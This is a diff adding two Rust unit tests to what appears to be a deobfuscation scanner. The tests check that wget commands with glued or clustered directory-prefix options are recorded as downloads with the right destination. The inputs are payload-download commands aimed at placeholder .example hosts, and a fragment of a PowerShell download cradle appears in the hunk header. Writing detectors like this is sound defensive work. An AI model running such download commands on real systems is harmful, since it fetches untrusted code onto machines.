@@ -19945,6 +19945,58 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
     }
 
     #[test]
+    fn wget_glued_short_directory_prefix_in_deob_text_records_destination_prefix() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"wget -PC:\Temp https://wget-glued-prefix-deob.example/payload.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![(
+                "https://wget-glued-prefix-deob.example/payload.bin",
+                Some(r#"C:\Temp"#)
+            )],
+            "traits: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn wget_clustered_short_directory_prefix_in_deob_text_records_destination_prefix() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"wget -qPC:\Temp https://wget-cluster-prefix-deob.example/payload.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![(
+                "https://wget-cluster-prefix-deob.example/payload.bin",
+                Some(r#"C:\Temp"#)
+            )],
+            "traits: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn wget_short_option_cluster_in_deob_text_emits_clean_destination() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
